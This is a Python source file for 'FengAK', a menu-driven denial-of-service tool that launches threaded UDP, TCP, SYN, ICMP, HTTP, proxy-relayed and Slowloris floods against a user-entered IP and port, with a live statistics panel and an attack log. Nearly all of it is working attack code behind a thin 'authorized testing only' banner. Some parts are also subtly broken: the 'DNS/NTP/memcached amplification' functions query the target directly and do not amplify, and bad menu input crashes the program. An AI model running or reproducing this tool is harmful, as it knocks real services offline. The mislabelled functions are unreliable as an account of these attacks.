import os
import sys
import json
import time
import random
import socket
import struct
import threading
from datetime import datetime

try:
    from scapy.all import IP, TCP, UDP, ICMP, sr1, send
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

class AttackStats:
    def __init__(self):
        self.running = False
        self.start_time = 0
        self.sent = 0
        self.bytes_sent = 0
        self.peak_qps = 0
        self.errors = 0
        self._lock = threading.Lock()
        self._last_count = 0
        self._last_time = 0

    def add_packet(self, size=0):
        with self._lock:
            self.sent += 1
            self.bytes_sent += size

    def add_error(self):
        with self._lock:
            self.errors += 1

    def get_sent(self):
        with self._lock:
            return self.sent

    def get_bytes(self):
        with self._lock:
            return self.bytes_sent

    def get_elapsed(self):
        return time.time() - self.start_time

    def get_qps(self):
        now = time.time()
        with self._lock:
            dt = now - self._last_time if self._last_time else 1
            if dt <= 0:
                dt = 1
            qps = (self.sent - self._last_count) / dt
            self._last_count = self.sent
            self._last_time = now
            if qps > self.peak_qps:
                self.peak_qps = qps
            return qps

    def get_bandwidth(self):
        now = time.time()
        with self._lock:
            dt = now - self._last_time if self._last_time else 1
            if dt <= 0:
                dt = 1
            bw = (self.bytes_sent - self._last_bytes) / dt if hasattr(self, '_last_bytes') else 0
            self._last_bytes = self.bytes_sent
            return bw

stats = AttackStats()

class Color:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RESET = "\033[0m"

color = Color()

def format_number(n):
    if n >= 1_000_000:
        return f"{n / 1_000_000:.1f}M"
    if n >= 1_000:
        return f"{n / 1_000:.1f}K"
    return str(n)

def format_bytes(b):
    if b >= 1_073_741_824:
        return f"{b / 1_073_741_824:.2f} GB"
    if b >= 1_048_576:
        return f"{b / 1_048_576:.2f} MB"
    if b >= 1024:
        return f"{b / 1024:.2f} KB"
    return f"{b} B"

def udp_flood(target_ip, target_port, packet_size):
    while stats.running:
        try:
            payload = generate_random_payload(packet_size)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(payload, (target_ip, target_port))
            s.close()
            stats.add_packet(len(payload))
        except Exception:
            stats.add_error()

def tcp_flood(target_ip, target_port, packet_size):
    while stats.running:
        try:
            payload = generate_random_payload(packet_size)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, target_port))
            s.send(payload)
            s.close()
            stats.add_packet(len(payload))
        except Exception:
            stats.add_error()

def syn_flood(target_ip, target_port, packet_size):
    if not SCAPY_AVAILABLE:
        return tcp_flood(target_ip, target_port, packet_size)
    while stats.running:
        try:
            pkt = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
            send(pkt, verbose=False)
            stats.add_packet(packet_size)
        except Exception:
            stats.add_error()

def icmp_flood(target_ip, target_port, packet_size):
    if not SCAPY_AVAILABLE:
        return
    while stats.running:
        try:
            pkt = IP(dst=target_ip) / ICMP() / generate_random_payload(packet_size)
            send(pkt, verbose=False)
            stats.add_packet(packet_size)
        except Exception:
            stats.add_error()

def http_flood(target_ip, target_port, packet_size):
    while stats.running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, target_port))
            req = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
            s.send(req.encode())
            s.close()
            stats.add_packet(len(req))
        except Exception:
            stats.add_error()

def dns_amplification(target_ip, target_port, packet_size):
    if not SCAPY_AVAILABLE:
        return udp_flood(target_ip, target_port, packet_size)
    while stats.running:
        try:
            pkt = IP(dst=target_ip) / UDP(dport=53) / b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01"
            send(pkt, verbose=False)
            stats.add_packet(packet_size)
        except Exception:
            stats.add_error()

def proxy_flood(target_ip, target_port, packet_size, proxy_list):
    while stats.running:
        proxy = random.choice(proxy_list)
        try:
            ph, pp = proxy.split(":")
            pp = int(pp)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ph, pp))
            req = f"GET http://{target_ip}:{target_port}/ HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
            s.send(req.encode())
            s.close()
            stats.add_packet(len(req))
        except Exception:
            stats.add_error()

def slowloris_flood(target_ip, target_port, packet_size):
    while stats.running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_ip, target_port))
            s.send(b"GET / HTTP/1.1\r\n")
            time.sleep(2)
            s.send(b"X-a: b\r\n")
            time.sleep(2)
            s.close()
            stats.add_packet(packet_size)
        except Exception:
            stats.add_error()

def ntp_amplification(target_ip, target_port, packet_size):
    if not SCAPY_AVAILABLE:
        return udp_flood(target_ip, target_port, packet_size)
    while stats.running:
        try:
            pkt = IP(dst=target_ip) / UDP(dport=123) / b"\x17\x00\x03\x2a" + b"\x00" * (packet_size - 4)
            send(pkt, verbose=False)
            stats.add_packet(packet_size)
        except Exception:
            stats.add_error()

def memcached_amplification(target_ip, target_port, packet_size):
    if not SCAPY_AVAILABLE:
        return udp_flood(target_ip, target_port, packet_size)
    while stats.running:
        try:
            pkt = IP(dst=target_ip) / UDP(dport=11211) / b"\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n"
            send(pkt, verbose=False)
            stats.add_packet(packet_size)
        except Exception:
            stats.add_error()

def generate_random_payload(size):
    patterns = [
        lambda s: random._urandom(s),
        lambda s: b"A" * s,
        lambda s: b"\x00" * s,
        lambda s: (b"PAYLOAD" * (s // 7 + 1))[:s],
        lambda s: bytes([random.randint(0, 255) for _ in range(min(s, 4096))]),
    ]
    return random.choice(patterns)(size)

def load_config(config_file):
    try:
        with open(config_file, "r") as f:
            return json.load(f)
    except Exception:
        return {}

def save_log(entry):
    try:
        with open("attack_log.jsonl", "a") as f:
            f.write(json.dumps(entry) + "\n")
    except Exception:
        pass

def monitor_stats(target_ip, target_port, mode):
    while stats.running:
        print_status_panel(stats, target_ip, target_port, mode)
        time.sleep(1)

def run_attack(target_ip, target_port, mode, packet_size, threads, proxy_list=None):
    stats.running = True
    stats.start_time = time.time()
    stats.peak_qps = 0
    stats.errors = 0

    mode_map = {
        "udp": udp_flood,
        "tcp": tcp_flood,
        "syn": syn_flood,
        "icmp": icmp_flood,
        "http": http_flood,
        "dns": dns_amplification,
        "proxy": proxy_flood,
        "slowloris": slowloris_flood,
        "ntp": ntp_amplification,
        "memcached": memcached_amplification,
    }
    attack_func = mode_map.get(mode)
    if not attack_func:
        print(f"{color.RED}[-] Unknown attack mode: {mode}{color.RESET}")
        return
    if mode == "proxy" and not proxy_list:
        print(f"{color.RED}[-] Proxy mode requires a non-empty proxy list. Aborting.{color.RESET}")
        return

    monitor_thread = threading.Thread(target=monitor_stats, args=(target_ip, target_port, mode), daemon=True)
    monitor_thread.start()

    attack_threads = []
    for _ in range(threads):
        if mode == "proxy":
            t = threading.Thread(target=attack_func, args=(target_ip, target_port, packet_size, proxy_list))
        else:
            t = threading.Thread(target=attack_func, args=(target_ip, target_port, packet_size))
        t.daemon = True
        t.start()
        attack_threads.append(t)

    try:
        while stats.running:
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"\n{color.YELLOW}[!] Attack interrupted by user.{color.RESET}")

    stats.running = False
    for t in attack_threads:
        t.join(timeout=2)

    elapsed = stats.get_elapsed()
    sent = stats.get_sent()
    entry = {
        "time": datetime.now().isoformat(),
        "target": f"{target_ip}:{target_port}",
        "mode": mode,
        "threads": threads,
        "sent": sent,
        "bytes": stats.get_bytes(),
        "elapsed": elapsed,
        "errors": stats.errors,
        "peak_qps": stats.peak_qps,
    }
    save_log(entry)
    print(f"\n{color.GREEN}╔{'═' * 58}╗{color.RESET}")
    print(f"{color.GREEN}║{color.RESET} {color.BOLD}ATTACK SUMMARY{color.RESET}")
    print(f"{color.GREEN}║{color.RESET}  Total Sent : {format_number(sent)}")
    print(f"{color.GREEN}║{color.RESET}  Total Data : {format_bytes(stats.get_bytes())}")
    print(f"{color.GREEN}║{color.RESET}  Duration   : {elapsed:.1f}s")
    print(f"{color.GREEN}║{color.RESET}  Peak QPS   : {format_number(stats.peak_qps)}")
    print(f"{color.GREEN}║{color.RESET}  Errors     : {stats.errors}")
    print(f"{color.GREEN}╚{'═' * 58}╝{color.RESET}")

def handle_error(allow_edit=True):
    while True:
        if allow_edit:
            choice = input(f"{color.YELLOW}[?] Return to menu (y), Exit (n), or Edit (e): {color.RESET}").strip().lower()
            if choice == 'y': return 'y'
            elif choice == 'n':
                print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
                sys.exit(0)
            elif choice == 'e': return 'e'
            else: print(f"{color.RED}[-] Invalid input. Please enter 'y', 'n', or 'e'.{color.RESET}")
        else:
            choice = input(f"{color.YELLOW}[?] Return to menu (y) or Exit (n): {color.RESET}").strip().lower()
            if choice == 'y': return 'y'
            elif choice == 'n':
                print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
                sys.exit(0)
            else: print(f"{color.RED}[-] Invalid input. Please enter 'y' or 'n'.{color.RESET}")

def load_proxies(proxy_file):
    proxies = []
    try:
        with open(proxy_file, "r") as f:
            for line in f:
                line = line.strip()
                if line and ":" in line:
                    proxies.append(line)
    except FileNotFoundError:
        print(f"{color.RED}[-] Proxy file not found: {proxy_file}{color.RESET}")
    return proxies

def validate_proxies(proxy_list, timeout=2):
    valid = []
    print(f"{color.CYAN}[*] Validating {len(proxy_list)} proxies...{color.RESET}")
    for p in proxy_list:
        try:
            host, port = p.split(":")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            if s.connect_ex((host, int(port))) == 0:
                valid.append(p)
            s.close()
        except Exception:
            pass
    print(f"{color.GREEN}[+] {len(valid)} / {len(proxy_list)} proxies are alive.{color.RESET}")
    return valid

def get_terminal_width():
    try:
        return os.get_terminal_size().columns
    except Exception:
        return 80

def strip_ansi(text):
    import re
    return re.sub(r'\x1b\[[0-9;]*m', '', text)

def print_status_panel(stats_obj, target_ip, target_port, mode):
    elapsed = stats_obj.get_elapsed()
    sent = stats_obj.get_sent()
    qps = stats_obj.get_qps()
    bw = stats_obj.get_bandwidth()
    peak = stats_obj.peak_qps
    minutes = int(elapsed // 60)
    seconds = int(elapsed % 60)

    width = get_terminal_width()
    fields = [
        f"TARGET  {target_ip}:{target_port}",
        f"MODE    {mode.upper()}",
        f"TIME    {minutes:02d}:{seconds:02d}",
        f"SENT    {format_number(sent)}",
        f"QPS     {format_number(qps)}",
        f"PEAK    {format_number(peak)}",
        f"DATA    {format_bytes(stats_obj.get_bytes())}",
        f"ERRORS  {stats_obj.errors}",
    ]

    half = len(fields) // 2
    left = fields[:half]
    right = fields[half:]
    rows = max(len(left), len(right))
    while len(left) < rows:
        left.append("")
    while len(right) < rows:
        right.append("")

    col_w = max(len(strip_ansi(l)) for l in left + right) if left else 20
    col_w = min(col_w, (width - 8) // 2 - 2)

    lines = []
    header = f" LIVE STATUS ".center(width - 4)
    lines.append(f"{color.CYAN}╔{'═' * (width - 4)}╗{color.RESET}")
    lines.append(f"{color.CYAN}║{color.RESET} {color.BOLD}{header}{color.RESET} {color.CYAN}║{color.RESET}")
    lines.append(f"{color.CYAN}╠{'═' * (width - 4)}╣{color.RESET}")

    for l, r in zip(left, right):
        lp = col_w - len(strip_ansi(l))
        rp = col_w - len(strip_ansi(r))
        lp = max(0, lp)
        rp = max(0, rp)
        mid = width - 4 - 2 - col_w - lp - 2 - col_w - rp
        mid = max(0, mid)
        line = f"{color.CYAN}║{color.RESET} {color.GREEN}{l}{' ' * lp}{color.RESET} {color.DIM}{' ' * mid}{color.RESET} {color.YELLOW}{r}{' ' * rp}{color.RESET} {color.CYAN}║{color.RESET}"
        lines.append(line)

    lines.append(f"{color.CYAN}╚{'═' * (width - 4)}╝{color.RESET}")

    print("\033[" + str(len(lines)) + "A\033[J", end="")
    print("\n".join(lines), flush=True)

def show_banner():
    os.system("clear")
    os.system("figlet FengAK")
    print(f"{color.CYAN}┌{'─' * 58}┐{color.RESET}")
    print(f"{color.CYAN}│{color.RESET} {color.BOLD}FengAK{color.RESET}  {color.MAGENTA}v0.6.0{color.RESET}  {color.DIM}Network Stress Testing Framework{color.RESET}")
    print(f"{color.CYAN}├{'─' * 58}┤{color.RESET}")
    print(f"{color.CYAN}│{color.RESET} {color.DIM}AUTHOR :{color.RESET} FengPwner")
    print(f"{color.CYAN}│{color.RESET} {color.DIM}GITHUB :{color.RESET} github.com/FengPwner")
    print(f"{color.CYAN}│{color.RESET} {color.DIM}ATOMGIT:{color.RESET} atomgit.com/FengPwner")
    print(f"{color.CYAN}│{color.RESET} {color.DIM}CSDN   :{color.RESET} blog.csdn.net/2302_76189356")
    print(f"{color.CYAN}└{'─' * 58}┘{color.RESET}")
    print(f"{color.RED}{color.BOLD}  ⚠  FOR AUTHORIZED TESTING ONLY - DO NOT USE ILLEGALLY  ⚠{color.RESET}\n")

def show_menu():
    print(f"{color.CYAN}{'=' * 58}{color.RESET}")
    print(f"{color.BOLD}  Attack Modes:{color.RESET}")
    print(f"{color.CYAN}{'=' * 58}{color.RESET}")
    print(f"  {color.GREEN}1{color.RESET}. UDP Flood          {color.GREEN}2{color.RESET}. TCP Flood")
    print(f"  {color.GREEN}3{color.RESET}. SYN Flood          {color.GREEN}4{color.RESET}. ICMP Flood")
    print(f"  {color.GREEN}5{color.RESET}. HTTP Flood         {color.GREEN}6{color.RESET}. DNS Amplification")
    print(f"  {color.GREEN}7{color.RESET}. Proxy Flood        {color.GREEN}8{color.RESET}. Slowloris")
    print(f"  {color.GREEN}9{color.RESET}. NTP Amplification  {color.GREEN}10{color.RESET}. Memcached Amplification")
    print(f"{color.CYAN}{'=' * 58}{color.RESET}")
    print(f"  {color.YELLOW}0{color.RESET}. Exit")
    print(f"{color.CYAN}{'=' * 58}{color.RESET}")

def main():
    show_banner()
    config = load_config("config.json")

    while True:
        show_menu()
        choice = input(f"{color.CYAN}[?] Select mode (0-10): {color.RESET}").strip()

        mode_map = {
            "1": "udp", "2": "tcp", "3": "syn", "4": "icmp",
            "5": "http", "6": "dns", "7": "proxy", "8": "slowloris",
            "9": "ntp", "10": "memcached",
        }

        if choice == "0":
            print(f"{color.GREEN}[*] Exiting. Stay ethical.{color.RESET}")
            break

        if choice not in mode_map:
            print(f"{color.RED}[-] Invalid choice.{color.RESET}")

        mode = mode_map[choice]
        target_ip = input(f"{color.CYAN}[?] Target IP: {color.RESET}").strip()
        if not target_ip:
            target_ip = config.get("target_ip", "127.0.0.1")
            print(f"{color.YELLOW}[*] Using default target: {target_ip}{color.RESET}")

        try:
            target_port = int(input(f"{color.CYAN}[?] Target port (default 80): {color.RESET}").strip() or config.get("target_port", 80))
            if target_port <= 0:
                raise ValueError
        except ValueError:
            print(f"{color.RED}[-] Port must be greater than zero.{color.RESET}")
            handle_error()
            continue

        try:
            packet_size = int(input(f"{color.CYAN}[?] Packet size (default 64): {color.RESET}").strip() or config.get("packet_size", 64))
            if packet_size <= 0:
                raise ValueError
        except ValueError:
            print(f"{color.RED}[-] Packet size must be greater than zero.{color.RESET}")
            handle_error()
            continue

        try:
            threads = int(input(f"{color.CYAN}[?] Threads (default 10): {color.RESET}").strip() or config.get("threads", 10))
            if threads <= 0:
                raise ValueError
        except ValueError:
            print(f"{color.RED}[-] Threads must be greater than zero.{color.RESET}")
            handle_error()
            continue

        proxy_list = None
        if mode == "proxy":
            proxy_file = input(f"{color.CYAN}[?] Proxy list file (default proxies.txt): {color.RESET}").strip() or "proxies.txt"
            proxy_list = load_proxies(proxy_file)
            if not proxy_list:
                print(f"{color.RED}[-] No proxies loaded. Aborting.{color.RESET}")
                handle_error()
                continue
            proxy_list = validate_proxies(proxy_list)
            if not proxy_list:
                print(f"{color.RED}[-] No valid proxies found. Aborting.{color.RESET}")
                handle_error()
                continue

        print(f"\n{color.GREEN}[*] Launching {mode.upper()} attack against {target_ip}:{target_port} with {threads} threads...{color.RESET}")
        print(f"{color.DIM}[*] Press Ctrl+C to stop.{color.RESET}\n")

        run_attack(target_ip, target_port, mode, packet_size, threads, proxy_list)

        again = handle_error(allow_edit=False)
        if again == 'n':
            print(f"{color.GREEN}[*] Exiting. Stay ethical.{color.RESET}")
            break

if __name__ == "__main__":
    main()
